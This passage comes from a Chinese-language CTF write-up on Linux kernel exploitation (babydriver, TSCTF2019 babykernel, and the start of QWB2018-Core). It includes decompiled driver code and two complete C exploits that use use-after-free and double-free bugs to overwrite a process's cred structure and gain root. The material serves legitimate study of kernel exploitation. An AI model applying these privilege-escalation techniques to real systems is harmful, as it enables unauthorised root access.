<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  result = <span class="number">-2L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ioctl是最简单的和设备通信的方式，开发者可以在其中根据arg参数决定对设备不同的操作，这里注意command需要是一个唯一的数字，否则可能会进行其他未知的操作，在新的标准里command是有结构的，不同的位有不同功能，这里也不深究了，如果command是0x10001，则释放device_buf，再分配一个指定size的内存地址赋给device_buf。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line">__int64 __<span class="function">fastcall <span class="title">babyioctl</span><span class="params">(file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="keyword">char</span> *)_kmalloc(v4, <span class="number">0x24000C0</span>LL);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">"alloc done\n"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB);</span><br><span class="line">    result = <span class="number">-22L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>release函数调用发生在关闭设备文件的时候，这里会free掉buf</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);             <span class="comment">// exec when close(fd)</span></span><br><span class="line">  printk(<span class="string">"device release\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>这里的漏洞出现在驱动没有处理好并发，在驱动开发的时候，驱动必须是可重入的，也就是说必须是可以支持被多次打开的，这里release的kfree之后没有清空全局变量babydev_struct.device_buf，全局变量在两次打开设备文件的时候是共享的，也就是说如果我们两次打开设备，在第一次free掉buf，在第二次仍能继续读写数据。</p>
<p>最简单的利用方式是阅读该版本的linux源码，获取struct cred的大小(这里是0xa8)，在第一个设备操作中关闭文件free掉buf，再fork一个新的进程，每次fork的时候会分配一个struct cred结构体来标明进程的权限，这个结构体会将父进程的cred复制过来，分配到的恰好是我们分配的结构体(slab分配器类似fastbin的分配方式)，这时候我们在父进程里通过write修改全局变量的device_buf，实际上是修改cred，我们把uid改为0即可在子进程提权，之后在其中打开shell即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="keyword">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="keyword">void</span>        *put_addr;</span><br><span class="line">    <span class="keyword">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="keyword">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="keyword">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">    <span class="keyword">unsigned</span>    securebits; <span class="comment">/* SUID-less security management */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_permitted;  <span class="comment">/* caps we're permitted */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_effective;  <span class="comment">/* caps we can actually use */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_bset;   <span class="comment">/* capability bounding set */</span></span><br><span class="line">    <span class="keyword">kernel_cap_t</span>    cap_ambient;    <span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   jit_keyring;    <span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">                     * keys to */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="keyword">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h4><p>exp拿c写，cred的前28个字节改为0即可，exp如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>,<span class="number">2</span>);</span><br><span class="line">    ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0xa8</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">char</span> zeros[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2,zeros,<span class="keyword">sizeof</span>(zeros));</span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="TSCTF2019-gt-babykernel"><a href="#TSCTF2019-gt-babykernel" class="headerlink" title="TSCTF2019-&gt;babykernel"></a>TSCTF2019-&gt;babykernel</h3><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>比赛的时候没做出来，半年之后过来考古233.</p>
<p>ioctl有几个功能：</p>
<ol>
<li>cmd=<code>0x22B8</code>，往<code>BUY_LIST[arg3]</code>赋值0x123456789ABCDEF0LL</li>
<li>cmd=<code>0x271A</code>，固定分配<code>0xd0</code>的obj到<code>BUY_LIST[arg3]</code>并执行<code>*(_QWORD *)(BUY_LIST[arg33] + 8) = 0LL;</code>等赋值命令</li>
<li>cmd=<code>0x2766</code>，释放<code>BUY_LIST[arg3]</code>，这里有double free</li>
<li>cmd=<code>0x1A0A</code>，同1一样赋值<code>BUY_LIST[arg3]</code>为0xFEDCBA987654321LL</li>
</ol>
<p>漏洞到这里已经很清楚了，bss上的全局变量释放后未清空，保护有<code>smap</code>和<code>smep</code>，调试可以看到(源码也可以直接看)cred大小恰为0xd0，所以我们释放一个obj，随后fork进程复用这个obj，在主进程再次释放此obj随即alloc到它，之前的*(obj+8)可以将uid位清零，子进程的权限提升为root。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">tshop_ioctl</span><span class="params">(__int64 arg1, <span class="keyword">unsigned</span> <span class="keyword">int</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">int</span> arg3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// si</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v9; <span class="comment">// rdi</span></span><br><span class="line">  _QWORD *v11; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *v12; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = (<span class="keyword">signed</span> <span class="keyword">int</span>)arg3;</span><br><span class="line">  <span class="keyword">if</span> ( arg2 == <span class="number">0x22B8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( arg3 &lt;= <span class="number">0xFF</span> &amp;&amp; (v12 = (_QWORD *)BUY_LIST[arg3]) != <span class="number">0L</span>L )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="string">"&lt;1&gt;[*] This Zege is yours!"</span>;</span><br><span class="line">      *v12 = <span class="number">0x123456789ABCDEF0</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="string">"&lt;1&gt;[*] Zege would not like you!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( arg2 &gt; <span class="number">0x22B8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( arg2 == <span class="number">0x271A</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( arg3 &lt;= <span class="number">0xFF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = (_QWORD *)kmem_cache_alloc(zegeorjige, <span class="number">0xD0</span>LL);</span><br><span class="line">        BUY_LIST[v3] = (__int64)v4;</span><br><span class="line">        *v4 = <span class="number">0L</span>L;</span><br><span class="line">        v5 = zegeandjigedesc;</span><br><span class="line">        *(_QWORD *)(BUY_LIST[v3] + <span class="number">8</span>) = <span class="number">0L</span>L;</span><br><span class="line">        *(_QWORD *)(BUY_LIST[v3] + <span class="number">16</span>) = <span class="number">64L</span>L;</span><br><span class="line">        *(_QWORD *)(BUY_LIST[v3] + <span class="number">24</span>) = <span class="number">0x29AA</span>LL;</span><br><span class="line">        v6 = <span class="number">0L</span>L;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = v5[v6];</span><br><span class="line">          v8 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v6++;</span><br><span class="line">          *(_BYTE *)(BUY_LIST[v3] + v8 + <span class="number">0x20</span>) = v7;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v6 != <span class="number">0x21</span> );</span><br><span class="line">        v9 = <span class="string">"&lt;1&gt;[*] Money fly\n"</span>;</span><br><span class="line">        *(_BYTE *)(BUY_LIST[v3] + <span class="number">0x41</span>) = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( arg2 != <span class="number">0x2766</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">      <span class="keyword">if</span> ( arg3 &lt;= <span class="number">0xFF</span> &amp;&amp; BUY_LIST[arg3] )</span><br><span class="line">      &#123;</span><br><span class="line">        kfree();</span><br><span class="line">        v9 = <span class="string">"&lt;1&gt;[*] Say goodbye to flag\n"</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = <span class="string">"&lt;1&gt;[*] Zege and Jige would not like you!"</span>;</span><br><span class="line">LABEL_16:</span><br><span class="line">    printk(v9);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( arg2 == <span class="number">0x1A0A</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( arg3 &lt;= <span class="number">0xFF</span> &amp;&amp; (v11 = (_QWORD *)BUY_LIST[arg3]) != <span class="number">0L</span>L )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="string">"&lt;1&gt;[*] This Jige is yours!"</span>;</span><br><span class="line">      *v11 = <span class="number">0xFEDCBA987654321</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="string">"&lt;1&gt;[*] Jige would not like you!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="exp-c"><a href="#exp-c" class="headerlink" title="exp.c"></a>exp.c</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MallocCmd 0x271a</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FreeCmd 0x2766</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Malloc</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd,MallocCmd,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Free</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd,FreeCmd,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/tshop"</span>,<span class="number">2</span>);</span><br><span class="line">    Malloc(fd,<span class="number">0</span>);</span><br><span class="line">    Malloc(fd,<span class="number">1</span>);</span><br><span class="line">    Free(fd,<span class="number">0</span>);</span><br><span class="line">    Free(fd,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> pid = fork();<span class="comment">//now we alloc cred using obj1</span></span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(getuid() != <span class="number">0</span>)&#123;</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        system(<span class="string">"id"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        Free(fd,<span class="number">1</span>);<span class="comment">//now we free cred</span></span><br><span class="line">        Malloc(fd,<span class="number">2</span>);<span class="comment">//set uid=0</span></span><br><span class="line">        <span class="comment">//wait(NULL);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Kernel-ROP"><a href="#Kernel-ROP" class="headerlink" title="Kernel ROP"></a>Kernel ROP</h2><h3 id="QWB2018-Core"><a href="#QWB2018-Core" class="headerlink" title="QWB2018-Core"></a>QWB2018-Core</h3><h4 id="寻找rops"><a href="#寻找rops" class="headerlink" title="寻找rops"></a>寻找rops</h4><p>vmlinux是未经压缩的二进制文件，可以使用<code>ropper --file ./vmlinux &gt; rops</code>将寻找的rop存放起来，如果题目没有给vmlinux可以拿<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank" rel="noopener">extract-vmlinux</a>进行提取<code>./extract-vmlinux ./bzImage &gt; ./vmlinux</code></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>查看启动脚本，发现开了<code>kaslr</code>保护，解压cpio文件<code>cpio -idm &lt; ./core.cpio</code>，文件夹下有系统的初始化脚本init，其内容为。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'sh end!\n'</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
